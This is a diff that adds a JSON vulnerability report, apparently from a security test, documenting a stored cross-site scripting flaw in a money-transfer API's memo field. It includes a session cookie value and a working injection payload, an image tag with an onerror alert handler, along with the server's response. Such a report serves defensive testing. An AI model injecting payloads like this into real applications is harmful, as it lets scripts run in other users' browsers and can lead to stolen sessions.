@@ -1,0 +1,27 @@
+{
+  "id": "VULN-003",
+  "type": "XSS",
+  "endpoint": "/api/transfers",
+  "http_method": "POST",
+  "severity": "medium",
+  "description": "Unsanitized transfer memo enables Stored XSS script execution.",
+  "reproduction": {
+    "headers": {
+      "Cookie": "session_token=5c0c1a8b5aaa640db6843ef80dab0f1541a32f6a4ea673af048fd9586163d207",
+      "Content-Type": "application/json"
+    },
+    "payload": {
+      "to_account_number": "ACC-1002",
+      "amount": 1,
+      "description": "<img src=x onerror=\"alert('XSS-DEMO')\">"
+    },
+    "url_params": {},
+    "test_user": "Alice"
+  },
+  "evidence": {
+    "status_code": 200,
+    "response_body": "{\"message\":\"Transfer successful\"}",
+    "extracted_data": "Payload '<img src=x onerror=...>' stored without sanitization."
+  },
+  "timestamp": "2026-09-26T23:16:03.649631Z"
+}
